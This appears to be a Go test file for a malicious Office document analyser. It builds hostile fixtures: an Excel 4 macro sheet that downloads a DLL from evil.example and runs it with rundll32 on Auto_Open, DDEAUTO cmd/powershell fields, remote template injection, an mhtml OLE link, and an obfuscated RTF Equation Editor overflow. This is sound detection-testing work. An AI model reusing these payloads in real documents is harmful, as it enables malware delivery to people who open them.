package extractor

import (
	"archive/zip"
	"bytes"
	"context"
	"encoding/binary"
	"strings"
	"testing"

	"maldoctrace/internal/cfbtest"
)

func TestFtabTable(t *testing.T) {
	if len(ftab) != 380 || ftab[379] != "RTD" || ftab[110] != "EXEC" || ftab[150] != "CALL" {
		t.Fatalf("ftab has %d entries, [110]=%s [150]=%s", len(ftab), ftab[110], ftab[150])
	}
	for idx, want := range map[int]string{0x8000 | 96: "FORMULA", 0x8000 | 118: "ALERT", 0x8000 | 383: "WORKBOOK.HIDE", 53: "GOTO", 0x8000 | 9999: "CE_9999", 202: "FUNC_202"} {
		if got := funcName(idx); got != want {
			t.Errorf("funcName(%#x) = %s, want %s", idx, got, want)
		}
	}
}

func xlmSample() []byte {
	exec := `=EXEC("rundll32.exe C:\Users\Public\x.dll,DllRegisterServer")`
	return cfbtest.MacroWorkbook("Macro1", true, 0, 0, "Enable content", []cfbtest.Formula{
		{Row: 0, Col: 0, Rgce: cfbtest.Cat(cfbtest.PtgStr("http://evil.example/p"), cfbtest.PtgStr("ayload.dll"), cfbtest.PtgConcat)},
		{Row: 1, Col: 0, Rgce: cfbtest.Cat(cfbtest.PtgStr("urlmon"), cfbtest.PtgStr("URLDownloadToFileA"), cfbtest.PtgStr("JJCCJJ"),
			cfbtest.PtgInt(0), cfbtest.PtgRef(0, 0), cfbtest.PtgStr(`C:\Users\Public\x.dll`), cfbtest.PtgInt(0), cfbtest.PtgInt(0), cfbtest.PtgFuncVar(8, 150))},
		{Row: 2, Col: 0, Rgce: cfbtest.Cat(cfbtest.PtgStr(exec), cfbtest.PtgRef(4, 0), cfbtest.PtgFuncVar(2, 0x8000|96))},
		{Row: 3, Col: 0, Rgce: cfbtest.Cat(cfbtest.PtgRef(4, 0), cfbtest.PtgFunc(53))},
		{Row: 5, Col: 0, Rgce: cfbtest.PtgFuncVar(0, 54)},
	})
}

func TestBIFFMacroSheet(t *testing.T) {
	res, err := Extract(context.Background(), xlmSample(), nil)
	if err != nil {
		t.Fatal(err)
	}
	if !res.HasXLM() || len(res.Sheets) != 2 {
		t.Fatalf("sheets=%d xlm=%v diags=%v", len(res.Sheets), res.HasXLM(), res.Diagnostics)
	}
	ws, ms := res.Sheets[0], res.Sheets[1]
	if ws.Kind != "worksheet" || len(ws.Cells) != 1 || ws.Cells[0].Value != "Enable content" {
		t.Fatalf("worksheet = %+v", ws)
	}
	if ms.Name != "Macro1" || ms.Kind != "macrosheet" || ms.Visibility != "hidden" {
		t.Fatalf("macro sheet = %+v", ms)
	}
	want := []string{
		`="http://evil.example/p"&"ayload.dll"`,
		`=CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,$A$1,"C:\Users\Public\x.dll",0,0)`,
		`=FORMULA("=EXEC(""rundll32.exe C:\Users\Public\x.dll,DllRegisterServer"")",$A$5)`,
		`=GOTO($A$5)`,
		`=HALT()`,
	}
	if len(ms.Cells) != len(want) {
		t.Fatalf("got %d cells", len(ms.Cells))
	}
	for i, c := range ms.Cells {
		if c.Formula != want[i] || c.Undecoded {
			t.Errorf("cell %d: %q (undecoded=%v), want %q", i, c.Formula, c.Undecoded, want[i])
		}
	}
	if len(res.Names) != 1 || res.Names[0].Name != "Auto_Open" || res.Names[0].Formula != "=Macro1!$A$1" {
		t.Fatalf("names = %+v", res.Names)
	}
}

func TestDecompileUnknownToken(t *testing.T) {
	b := &biffBook{}
	if s, ok := b.decompile([]byte{0x18, 0x01}, ""); ok || !strings.Contains(s, "token 0x18") {
		t.Fatalf("got %q ok=%v", s, ok)
	}
	// Fixed-arity function without a known argument count.
	if _, ok := b.decompile(cfbtest.Cat(cfbtest.PtgInt(1), cfbtest.PtgFunc(4)), ""); ok {
		t.Fatal("PtgFunc with unknown arity must not decode")
	}
}

func TestSSTContinue(t *testing.T) {
	// "hello world" split across a CONTINUE boundary, switching from
	// compressed to UTF-16 in the continued part.
	first := []byte{2, 0, 0, 0, 2, 0, 0, 0, 3, 0, 0, 'a', 'b', 'c', 11, 0, 0, 'h', 'e', 'l', 'l', 'o'}
	cont := []byte{1, ' ', 0, 'w', 0, 'o', 0, 'r', 0, 'l', 0, 'd', 0}
	got := parseSST([][]byte{first, cont})
	if len(got) != 2 || got[0] != "abc" || got[1] != "hello world" {
		t.Fatalf("got %q", got)
	}
}

func zipOf(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	w := zip.NewWriter(&buf)
	for name, body := range files {
		f, _ := w.Create(name)
		f.Write([]byte(body))
	}
	w.Close()
	return buf.Bytes()
}

func TestTemplateInjectionAndDDE(t *testing.T) {
	doc := `<w:document xmlns:w="w"><w:body><w:p>
<w:r><w:fldChar w:fldCharType="begin"/></w:r>
<w:r><w:instrText>DDEAUTO c:\\windows\\system32\\cmd.exe "/k powershell -c calc"</w:instrText></w:r>
<w:r><w:fldChar w:fldCharType="end"/></w:r>
<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>DDE </w:instrText></w:r>
<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>QUOTE 99 109 100</w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r>
<w:r><w:instrText> "x"</w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r>
<w:fldSimple w:instr="INCLUDEPICTURE &quot;http://track.example/p.png&quot; \d"/>
</w:p></w:body></w:document>`
	data := zipOf(t, map[string]string{
		"word/document.xml":            doc,
		"word/_rels/settings.xml.rels": `<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.example/t.dotm" TargetMode="External"/></Relationships>`,
		"word/_rels/document.xml.rels": `<Relationships><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="mhtml:http://evil.example/x.html!x-usc:http://evil.example/x.html" TargetMode="External"/></Relationships>`,
		"word/settings.xml":            `<w:settings xmlns:w="w"><w:docVars><w:docVar w:name="payload" w:val="cG93ZXJzaGVsbA=="/></w:docVars></w:settings>`,
		"docProps/core.xml":            `<cp:coreProperties xmlns:cp="c" xmlns:dc="d"><dc:description>hidden comment</dc:description><dc:creator>x</dc:creator></cp:coreProperties>`,
		"docProps/custom.xml":          `<Properties><property name="k1"><vt:lpwstr xmlns:vt="v">secret value</vt:lpwstr></property></Properties>`,
	})
	res, err := Extract(context.Background(), data, nil)
	if err != nil {
		t.Fatal(err)
	}
	kinds := map[string]ExternalRef{}
	for _, e := range res.External {
		kinds[e.Kind+":"+e.Target] = e
	}
	for _, k := range []string{
		"template_injection:http://evil.example/t.dotm",
		`dde:DDEAUTO c:\\windows\\system32\\cmd.exe "/k powershell -c calc"`,
		`dde:DDE cmd "x"`,
		"external_field:http://track.example/p.png",
	} {
		if _, ok := kinds[k]; !ok {
			t.Errorf("missing %s in %+v", k, res.External)
		}
	}
	if e := kinds["external_ole:mhtml:http://evil.example/x.html!x-usc:http://evil.example/x.html"]; e.Severity != "high" || !strings.Contains(e.Detail, "CVE-2021-40444") {
		t.Errorf("mhtml oleObject = %+v", e)
	}
	props := map[string]string{}
	for _, p := range res.Properties {
		props[p.Kind+":"+p.Name] = p.Value
	}
	if props["variable:payload"] != "cG93ZXJzaGVsbA==" || props["builtin:Comments"] != "hidden comment" || props["custom:k1"] != "secret value" {
		t.Errorf("properties = %v", props)
	}
}

func TestFieldCodesInWordBinaryText(t *testing.T) {
	res := &Result{}
	scanFieldCodes("intro\x13 DDEAUTO cmd \"/c calc\" \x14result\x15 tail\x13 PAGE \x15", "WordDocument", res)
	if len(res.External) != 1 || res.External[0].Kind != "dde" || !strings.Contains(res.External[0].Detail, "automatically") {
		t.Fatalf("got %+v", res.External)
	}
}

func TestDDEFormula(t *testing.T) {
	res := &Result{}
	checkFormulaDDE("Sheet1!A1", `=cmd|' /C calc'!A0`, res)
	if len(res.External) != 1 || res.External[0].Target != "cmd| /C calc!A0" {
		t.Fatalf("got %+v", res.External)
	}
}

func TestRTFObfuscatedEquation(t *testing.T) {
	// OLE1 header: version, format 2 (embedded), class "Equation.3", empty
	// topic and item, native data = MTEF with an overflowing FONT name.
	var obj []byte
	u32 := func(v uint32) { obj = binary.LittleEndian.AppendUint32(obj, v) }
	u32(0x0501)
	u32(2)
	u32(11)
	obj = append(obj, "EqUaTiOn.3\x00"...)
	u32(0)
	u32(0)
	native := append([]byte{3, 1, 1, 3, 10, 0x08, 0x5A, 0x5A}, bytes.Repeat([]byte{0x90}, 48)...)
	native = append(native, 0)
	u32(uint32(len(native)))
	obj = append(obj, native...)
	hexs := hexString(obj)
	// Obfuscate: a parameter on \objdata, ignorable groups and junk
	// characters inside the hex stream.
	half := len(hexs) / 2
	rtf := `{\rtf1{\object\objemb\objupdate{\*\objclass}\objdata0042{\*\junk 4142}` + hexs[:half] + ` zz {\*\x 00} ` + hexs[half:] + `}}{\*\template http://evil.example/t.dot}`
	res, _ := Extract(context.Background(), []byte(rtf), nil)
	if res.Format != FormatRTF {
		t.Fatalf("format %v", res.Format)
	}
	got := map[string]ExternalRef{}
	for _, e := range res.External {
		got[e.Kind] = e
	}
	if e := got["embedded_ole"]; e.Target != "EqUaTiOn.3" || e.Severity != "high" {
		t.Errorf("embedded = %+v", e)
	}
	if e := got["equation_editor_exploit"]; !strings.Contains(e.Detail, "48 bytes") || !strings.HasPrefix(e.Target, "9090") {
		t.Errorf("exploit = %+v", e)
	}
	if e := got["template_injection"]; e.Target != "http://evil.example/t.dot" {
		t.Errorf("template = %+v", e)
	}
	if _, ok := got["ole_autoupdate"]; !ok {
		t.Errorf("missing objupdate in %+v", res.External)
	}
}

func TestShapeHyperlinkUTF16(t *testing.T) {
	var b []byte
	for _, r := range "xxhttp://lure.example/a\x00yy" {
		b = append(b, byte(r), 0)
	}
	got := utf16URLs(append([]byte{1}, b...))
	if len(got) != 1 || got[0] != "http://lure.example/a" {
		t.Fatalf("got %q", got)
	}
}

func TestOLEPropertySet(t *testing.T) {
	// One property set with Comments (id 6) as VT_LPSTR.
	var set []byte
	val := []byte{0x1E, 0, 0, 0, 6, 0, 0, 0, 'h', 'e', 'l', 'l', 'o', 0, 0, 0}
	set = binary.LittleEndian.AppendUint32(set, uint32(8+8+len(val)))
	set = binary.LittleEndian.AppendUint32(set, 1)
	set = binary.LittleEndian.AppendUint32(set, 6)
	set = binary.LittleEndian.AppendUint32(set, 16)
	set = append(set, val...)
	stream := make([]byte, 48)
	binary.LittleEndian.PutUint16(stream, 0xFFFE)
	binary.LittleEndian.PutUint32(stream[24:], 1)
	binary.LittleEndian.PutUint32(stream[44:], 48)
	stream = append(stream, set...)
	sets := parsePropertySets(stream)
	if len(sets) != 1 || sets[0].values[6] != "hello" {
		t.Fatalf("got %+v", sets)
	}
}

func TestParseCellRef(t *testing.T) {
	for in, want := range map[string][2]int{"A1": {0, 0}, "$B$12": {11, 1}, "aa3": {2, 26}, "R5C3": {4, 2}} {
		r, c, ok := ParseCellRef(in)
		if !ok || r != want[0] || c != want[1] {
			t.Errorf("%s → %d,%d,%v", in, r, c, ok)
		}
	}
	for _, bad := range []string{"", "A0", "EXEC", "ABCD1", "R0C1"} {
		if _, _, ok := ParseCellRef(bad); ok {
			t.Errorf("%q should not parse", bad)
		}
	}
	if CellName(4, 27) != "AB5" {
		t.Error(CellName(4, 27))
	}
}

func FuzzDecompile(f *testing.F) {
	f.Add(cfbtest.Cat(cfbtest.PtgStr("a"), cfbtest.PtgRef(1, 1), cfbtest.PtgFuncVar(2, 0x8000|96)))
	f.Add([]byte{0x19, 0x04, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00})
	f.Add([]byte{0x3B, 0, 0, 1, 0, 2, 0, 3, 0, 4, 0})
	f.Fuzz(func(t *testing.T, rgce []byte) {
		b := &biffBook{sheetNames: []string{"S"}, xti: [][3]int{{0, 0, 0}, {5, -1, 9}}, supbooks: []*biffSupBook{{self: true}}, names: []biffName{{name: "n"}}}
		b.decompile(rgce, "")
	})
}

func FuzzRTF(f *testing.F) {
	f.Add([]byte(`{\rtf1{\object\objdata 0105000002000000}}`))
	f.Add([]byte(`{\rt{\*\template http://x}{\*\fldinst DDEAUTO cmd}\objdata{\*\a}{\bin5 abcde}ff}`))
	f.Fuzz(func(t *testing.T, data []byte) {
		res := &Result{}
		scanRTF(append([]byte(`{\rt`), data...), res)
	})
}

func FuzzBIFF(f *testing.F) {
	f.Add(cfbtest.Record(0x0809, []byte{0, 6, 5, 0}))
	f.Add(cfbtest.Cat(cfbtest.Record(0x0809, []byte{0, 6, 5, 0}), cfbtest.Record(0x00FC, []byte{1, 0, 0, 0, 1, 0, 0, 0, 3, 0, 1, 'a'}), cfbtest.Record(0x003C, []byte{0, 'b'})))
	f.Fuzz(func(t *testing.T, wb []byte) {
		data := cfbtest.Build(cfbtest.Stream{Name: "Workbook", Data: append(cfbtest.Record(0x0809, []byte{0, 6, 5, 0}), wb...)})
		Extract(context.Background(), data, nil)
	})
}
